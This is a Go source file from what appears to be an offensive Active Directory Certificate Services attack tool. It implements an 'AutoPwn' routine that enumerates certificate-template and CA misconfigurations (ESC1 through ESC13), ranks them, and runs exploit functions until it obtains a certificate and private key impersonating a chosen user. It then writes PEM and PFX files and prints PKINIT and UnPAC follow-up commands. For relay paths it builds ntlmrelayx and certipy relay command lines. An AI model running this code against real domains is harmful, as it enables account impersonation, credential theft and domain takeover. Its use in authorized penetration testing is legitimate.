package pki

import (
	"bufio"
	"crypto"
	"crypto/x509"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
)

// AutoPwnConfig holds parameters for the auto-pwn orchestration engine.
type AutoPwnConfig struct {
	*ADCSConfig
	TargetUPN   string
	AttackerDN  string // needed for ESC9
	OutputDir   string
	DryRun      bool
	Interactive bool // prompt user to select which ESC path(s) to try
}

// AutoPwnResult holds the outcome of a successful auto-pwn run.
type AutoPwnResult struct {
	ESCPath      string `json:"esc_path"`
	TemplateName string `json:"template_name"`
	CertPath     string `json:"cert_path,omitempty"`
	KeyPath      string `json:"key_path,omitempty"`
	PFXPath      string `json:"pfx_path,omitempty"`
	RelayCommand string `json:"relay_command,omitempty"` // for ESC8/ESC11
}

// escCandidate represents a single exploitable path discovered during enumeration.
type escCandidate struct {
	escType      string
	score        int
	templateName string
	caName       string // ESC7: target CA name
	// relay-only fields
	relayCommand string
	isRelay      bool
}

// AutoPwn performs automated exploitation by enumerating all ADCS findings,
// building a priority-sorted list of exploitable paths, and attempting
// exploitation in order until one succeeds.
func AutoPwn(cfg *AutoPwnConfig) (*AutoPwnResult, error) {
	fmt.Println("[*] AutoPwn: Starting full ADCS enumeration...")

	// Step 1: Enumerate everything
	enumResult, err := EnumerateAll(cfg.ADCSConfig)
	if err != nil {
		return nil, fmt.Errorf("enumeration failed: %w", err)
	}

	fmt.Printf("[+] Enumeration complete: %d templates, %d total findings\n",
		len(enumResult.Templates), enumResult.VulnCount)

	// Step 2: Build priority-sorted candidate list
	candidates := buildCandidates(cfg, &enumResult)

	if len(candidates) == 0 {
		return nil, fmt.Errorf("no exploitable paths found — environment appears hardened")
	}

	// Sort by score descending (highest priority first)
	sort.Slice(candidates, func(i, j int) bool {
		return candidates[i].score > candidates[j].score
	})

	fmt.Printf("\n[+] Found %d exploitable path(s), sorted by priority:\n\n", len(candidates))
	for i, c := range candidates {
		relay := ""
		if c.isRelay {
			relay = " [RELAY — manual]"
		}
		fmt.Printf("  %d. [Score: %2d] %s via template %q%s\n",
			i+1, c.score, c.escType, c.templateName, relay)
	}
	fmt.Println()

	// Interactive path selection
	if cfg.Interactive && !cfg.DryRun {
		candidates = promptPathSelection(candidates)
		if len(candidates) == 0 {
			return nil, fmt.Errorf("no paths selected")
		}
	}

	// Step 3: Dry run — print the plan and exit
	if cfg.DryRun {
		fmt.Println("[*] DRY RUN — no exploitation attempted")
		fmt.Println("[*] Attack plan:")
		for i, c := range candidates {
			if c.isRelay {
				fmt.Printf("  %d. %s: %s\n", i+1, c.escType, c.relayCommand)
			} else {
				fmt.Printf("  %d. %s on template %q targeting %s\n",
					i+1, c.escType, c.templateName, cfg.TargetUPN)
			}
		}

		// Print PKINIT guidance for when exploitation completes
		upnUser := cfg.TargetUPN
		if idx := strings.Index(upnUser, "@"); idx > 0 {
			upnUser = upnUser[:idx]
		}
		fmt.Println()
		PrintPKINITCommands(&PKINITInfo{
			CertPath:  filepath.Join(cfg.OutputDir, upnUser+".crt"),
			KeyPath:   filepath.Join(cfg.OutputDir, upnUser+".key"),
			PFXPath:   filepath.Join(cfg.OutputDir, upnUser+".pfx"),
			PFXPass:   "",
			DC:        cfg.TargetDC,
			Domain:    cfg.Domain,
			TargetUPN: cfg.TargetUPN,
		})
		return nil, nil
	}

	// Ensure output directory exists
	if err := os.MkdirAll(cfg.OutputDir, 0700); err != nil {
		return nil, fmt.Errorf("create output directory %s: %w", cfg.OutputDir, err)
	}

	// Step 4: Attempt exploitation in priority order, stop on first success
	for i, c := range candidates {
		if c.isRelay {
			fmt.Printf("\n[*] Path %d/%d: %s — relay attack (cannot auto-exploit)\n",
				i+1, len(candidates), c.escType)
			fmt.Printf("[*] Manual command: %s\n", c.relayCommand)
			// Return relay info as a result — the operator executes manually
			return &AutoPwnResult{
				ESCPath:      c.escType,
				TemplateName: c.templateName,
				RelayCommand: c.relayCommand,
			}, nil
		}

		fmt.Printf("\n[*] Path %d/%d: Attempting %s on template %q...\n",
			i+1, len(candidates), c.escType, c.templateName)

		cert, key, exploitErr := executeExploit(cfg, c)
		if exploitErr != nil {
			fmt.Printf("[!] %s failed: %v\n", c.escType, exploitErr)
			fmt.Println("[*] Trying next path...")
			continue
		}

		// Check if the cert is self-signed (offline fallback) — skip and try next path
		if IsSelfSigned(cert) {
			fmt.Printf("[!] %s on %q produced a self-signed cert (CA enrollment failed) — skipping\n", c.escType, c.templateName)
			fmt.Println("[*] Trying next path...")
			continue
		}

		// Step 5: Write output files
		result, writeErr := writeAutoPwnOutput(cfg, c, cert, key)
		if writeErr != nil {
			fmt.Printf("[!] Output write failed: %v\n", writeErr)
			continue
		}

		// Step 6: Print PKINIT + UnPAC commands for next step
		fmt.Printf("\n[+] AutoPwn SUCCESS via %s on template %q\n\n", c.escType, c.templateName)
		PrintPKINITCommands(&PKINITInfo{
			CertPath:  result.CertPath,
			KeyPath:   result.KeyPath,
			PFXPath:   result.PFXPath,
			PFXPass:   "",
			DC:        cfg.TargetDC,
			Domain:    cfg.Domain,
			TargetUPN: cfg.TargetUPN,
		})
		if result.PFXPath != "" {
			PrintUnPACCommands(result.PFXPath, "", cfg.TargetDC, cfg.Domain, cfg.TargetUPN)
		}

		return result, nil
	}

	return nil, fmt.Errorf("all %d exploitation paths exhausted — none succeeded", len(candidates))
}

// buildCandidates constructs the prioritized list of exploitable paths from enumeration results.
func buildCandidates(cfg *AutoPwnConfig, result *EnumerationResult) []escCandidate {
	var candidates []escCandidate

	// Template-level vulnerabilities from EnumerateTemplates scoring
	for _, tmpl := range result.Templates {
		for _, vuln := range tmpl.ESCVulns {
			switch vuln {
			case "ESC1":
				candidates = append(candidates, escCandidate{
					escType: "ESC1", score: 10, templateName: tmpl.Name,
				})
			case "ESC2":
				candidates = append(candidates, escCandidate{
					escType: "ESC2", score: 8, templateName: tmpl.Name,
				})
			case "ESC3":
				candidates = append(candidates, escCandidate{
					escType: "ESC3", score: 7, templateName: tmpl.Name,
				})
			case "ESC4-EXPLOITABLE":
				candidates = append(candidates, escCandidate{
					escType: "ESC4", score: 6, templateName: tmpl.Name,
				})
			case "ESC6":
				candidates = append(candidates, escCandidate{
					escType: "ESC6", score: 9, templateName: tmpl.Name,
				})
			case "ESC9":
				if cfg.AttackerDN != "" {
					candidates = append(candidates, escCandidate{
						escType: "ESC9", score: 6, templateName: tmpl.Name,
					})
				} else {
					fmt.Printf("[*] ESC9 candidate %q skipped — no --attacker-dn provided\n", tmpl.Name)
				}
			}
		}
	}

	// ESC7: Vulnerable CA ACLs (ManageCA → enable ESC6 → exploit)
	for _, f := range result.ESC7Findings {
		candidates = append(candidates, escCandidate{
			escType: "ESC7", score: 4, caName: f.CAName,
		})
	}

	// ESC13: OID group link abuse
	for _, f := range result.ESC13Findings {
		candidates = append(candidates, escCandidate{
			escType: "ESC13", score: 5, templateName: f.TemplateName,
		})
	}

	// ESC8: NTLM relay to HTTP web enrollment (manual)
	for _, f := range result.ESC8Findings {
		if !f.NTLMEnabled {
			continue
		}
		tmplName := "Machine"
		if len(f.Templates) > 0 {
			tmplName = f.Templates[0]
		}
		relayCmd := fmt.Sprintf(
			"ntlmrelayx.py -t %scertfnsh.asp -smb2support --adcs --template %s",
			f.HTTPEndpoint, tmplName,
		)
		candidates = append(candidates, escCandidate{
			escType: "ESC8", score: 4, templateName: tmplName,
			relayCommand: relayCmd, isRelay: true,
		})
	}

	// ESC11: NTLM relay to RPC interface (manual)
	for _, f := range result.ESC11Findings {
		relayCmd := fmt.Sprintf(
			"certipy-ad relay -target rpc://%s -ca %q",
			f.CAHostname, f.CAName,
		)
		candidates = append(candidates, escCandidate{
			escType: "ESC11", score: 3, templateName: f.CAName,
			relayCommand: relayCmd, isRelay: true,
		})
	}

	return candidates
}

// executeExploit dispatches to the appropriate exploit function based on ESC type.
func executeExploit(cfg *AutoPwnConfig, c escCandidate) (*x509.Certificate, crypto.Signer, error) {
	switch c.escType {
	case "ESC1":
		return ExploitESC1(cfg.ADCSConfig, c.templateName, cfg.TargetUPN)
	case "ESC2":
		return ExploitESC2(cfg.ADCSConfig, c.templateName, cfg.TargetUPN)
	case "ESC3":
		return ExploitESC3(cfg.ADCSConfig, c.templateName, cfg.TargetUPN)
	case "ESC4":
		return ExploitESC4(cfg.ADCSConfig, c.templateName, cfg.TargetUPN)
	case "ESC6":
		return ExploitESC6(cfg.ADCSConfig, c.templateName, cfg.TargetUPN)
	case "ESC7":
		return ExploitESC7(cfg.ADCSConfig, c.caName, cfg.TargetUPN)
	case "ESC9":
		return ExploitESC9(cfg.ADCSConfig, c.templateName, cfg.AttackerDN, cfg.TargetUPN)
	case "ESC13":
		return ExploitESC13(cfg.ADCSConfig, c.templateName, cfg.TargetUPN)
	default:
		return nil, nil, fmt.Errorf("unsupported exploit type: %s", c.escType)
	}
}

// writeAutoPwnOutput writes cert, key, and PFX files to the output directory.
func writeAutoPwnOutput(cfg *AutoPwnConfig, c escCandidate, cert *x509.Certificate, key crypto.Signer) (*AutoPwnResult, error) {
	// Use UPN username as base, with ESC type suffix for disambiguation
	upnUser := cfg.TargetUPN
	if idx := strings.Index(upnUser, "@"); idx > 0 {
		upnUser = upnUser[:idx]
	}
	safeName := strings.ReplaceAll(upnUser, " ", "_")
	safeName = strings.ReplaceAll(safeName, "/", "_")

	baseName := fmt.Sprintf("%s_%s", safeName, strings.ToLower(c.escType))
	basePath := filepath.Join(cfg.OutputDir, baseName)

	if err := WriteCertKeyPEM(cert, key, basePath); err != nil {
		return nil, fmt.Errorf("write PEM: %w", err)
	}

	pfxPath := basePath + ".pfx"
	if err := WritePFX(cert, key, pfxPath, ""); err != nil {
		fmt.Printf("[!] PFX export failed (non-fatal): %v\n", err)
		pfxPath = ""
	}

	result := &AutoPwnResult{
		ESCPath:      c.escType,
		TemplateName: c.templateName,
		CertPath:     basePath + ".crt",
		KeyPath:      basePath + ".key",
		PFXPath:      pfxPath,
	}

	fmt.Printf("[+] Output files:\n")
	fmt.Printf("    Certificate: %s\n", result.CertPath)
	fmt.Printf("    Private key: %s\n", result.KeyPath)
	if pfxPath != "" {
		fmt.Printf("    PFX archive: %s\n", result.PFXPath)
	}

	return result, nil
}

// promptPathSelection presents an interactive menu for the user to choose
// which attack paths to attempt. Returns the filtered/reordered candidates.
func promptPathSelection(candidates []escCandidate) []escCandidate {
	fmt.Println("[?] Select path(s) to attempt:")
	fmt.Println("    Enter number(s) separated by commas (e.g. 1,3,5)")
	fmt.Println("    Enter 'all' to try all paths in order")
	fmt.Println("    Enter 'q' to abort")
	fmt.Print("\n    Selection: ")

	scanner := bufio.NewScanner(os.Stdin)
	if !scanner.Scan() {
		return candidates // EOF — use all
	}
	input := strings.TrimSpace(scanner.Text())

	if input == "" || strings.EqualFold(input, "all") {
		fmt.Println("[*] Trying all paths in priority order")
		return candidates
	}
	if strings.EqualFold(input, "q") || strings.EqualFold(input, "quit") {
		return nil
	}

	var selected []escCandidate
	parts := strings.Split(input, ",")
	for _, p := range parts {
		p = strings.TrimSpace(p)
		idx, err := strconv.Atoi(p)
		if err != nil || idx < 1 || idx > len(candidates) {
			fmt.Printf("[!] Invalid selection %q (valid: 1-%d)\n", p, len(candidates))
			continue
		}
		selected = append(selected, candidates[idx-1])
	}

	if len(selected) == 0 {
		fmt.Println("[!] No valid paths selected — aborting")
		return nil
	}

	fmt.Printf("[*] Selected %d path(s)\n\n", len(selected))
	return selected
}
